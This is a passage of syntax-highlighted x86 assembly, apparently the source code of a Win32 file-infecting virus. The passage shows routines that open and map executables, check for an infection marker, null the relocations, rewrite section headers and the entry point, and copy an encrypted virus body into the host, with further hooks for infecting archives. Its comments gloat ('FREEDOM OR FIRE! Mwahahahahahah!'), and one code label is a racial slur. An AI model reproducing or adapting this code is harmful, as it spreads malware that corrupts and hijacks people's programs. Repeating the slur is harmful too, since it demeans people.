    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">overit</span><span class="sc0">
</span><span class="sc5">ArchInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectArchives</span><span class="sc0">

</span><span class="sc5">overit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc5">n_infections</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FailInfect</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindNextFileA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">CloseSearchHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindClose</span><span class="sc0">
</span><span class="sc5">FailInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eBlock8</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Infect PE file (by using WFD info)                                     ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">Infection</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock9</span><span class="sc4">-</span><span class="sc5">Block9</span><span class="sc0">

</span><span class="sc5">Block9</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get FileName to infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">             </span><span class="sc1">; Wipe its attributes</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">                        </span><span class="sc1">; Open it</span><span class="sc0">

    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CantOpen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; 1st we create map with </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMap</span><span class="sc0">                       </span><span class="sc1">; its exact size</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">                         </span><span class="sc1">; Map it</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMapFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">            </span><span class="sc1">; Is it PE?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NoInfect</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mark</span><span class="sc4">],</span><span class="sc5">inf_mark</span><span class="sc0">   </span><span class="sc1">; Was it infected?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoInfect</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Close all</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; And Map all again.</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewSize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMap</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMapFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ler."</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_reloc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"co"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_reloc</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; Put a new name to .reloc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateName</span><span class="sc0">                    </span><span class="sc1">; section :)</span><span class="sc0">

</span><span class="sc5">not_reloc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Nulify the relocs, so they</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; won't fuck us :)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">section_flags</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">mark</span><span class="sc4">],</span><span class="sc5">inf_mark</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc0">                    </span><span class="sc1">; Pointer to 1st section-28h</span><span class="sc0">
</span><span class="sc5">nigger</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">; Ptr to section name ;)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Put in EDX the original EIP</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Remove the VirtualAddress</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Is EIP pointing to this sec?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">nigger</span><span class="sc0">                          </span><span class="sc1">; If not, loop again</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">section_flags</span><span class="sc0">         </span><span class="sc1">; Put sum attributes</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000100h</span><span class="sc0">                       </span><span class="sc1">; Alloc 256 bytes for store</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; the first bytes of the inf.</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">                    </span><span class="sc1">; files (temporally)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewBytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; FREEDOM OR FIRE! Mwahahahahahah!</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">phire</span><span class="sc0">                           </span><span class="sc1">; Ya wanna sum fire? &gt;:)</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">legacy</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
